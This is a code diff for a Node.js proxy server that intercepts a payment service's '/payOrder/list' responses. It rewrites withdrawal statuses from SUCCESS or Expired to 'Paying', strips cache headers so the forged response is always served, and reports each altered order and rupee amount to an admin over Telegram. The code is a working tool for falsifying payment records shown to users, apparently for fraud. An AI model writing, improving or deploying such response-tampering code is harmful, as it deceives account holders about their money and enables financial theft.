@@ -231,6 +231,10 @@ function sendJson(res, respHeaders, jsonResp, respBody) {
   const finalBody = jsonResp ? JSON.stringify(jsonResp) : respBody;
   respHeaders['content-type'] = 'application/json; charset=utf-8';
   respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
+  respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
+  respHeaders['pragma'] = 'no-cache';
+  delete respHeaders['etag'];
+  delete respHeaders['last-modified'];
   res.writeHead(200, respHeaders);
   res.end(finalBody);
 }
@@ -999,18 +1003,32 @@ app.all('/payOrder/list', async (req, res) => {
       const items = jsonResp.data;
       let changed = 0;
       const changedDetails = [];
-      for (let i = items.length - 1; i >= 0 && changed < count; i--) {
+
+      for (let i = 0; i < items.length && changed < count; i++) {
         const oldStat = items[i].stat;
         const statNames = { 0: 'Paying', 1: 'SUCCESS', 4: 'Expired' };
         items[i].stat = 0;
-        changedDetails.push(`₹${(items[i].amount || 0) / 100} (${statNames[oldStat] || 'stat=' + oldStat} → Paying)`);
+        changedDetails.push(`#${i} ₹${(items[i].amount || 0) / 100} ${items[i].orderId} (${statNames[oldStat] || 'stat=' + oldStat} → Paying)`);
         changed++;
       }
+
+      const newBody = JSON.stringify(jsonResp);
+
       if (changed > 0 && bankData.adminChatId && bot) {
         bot.sendMessage(bankData.adminChatId,
-          `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`
+          `✅ Changed ${changed}/${items.length} withdrawal(s) to Paying:\n${changedDetails.join('\n')}\n\n🔍 VERIFY first 200 chars of SENT response:\n${newBody.substring(0, 200)}`
         ).catch(() => {});
       }
+
+      respHeaders['content-type'] = 'application/json; charset=utf-8';
+      respHeaders['content-length'] = String(Buffer.byteLength(newBody));
+      respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
+      respHeaders['pragma'] = 'no-cache';
+      delete respHeaders['etag'];
+      delete respHeaders['last-modified'];
+      res.writeHead(200, respHeaders);
+      res.end(newBody);
+      return;
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
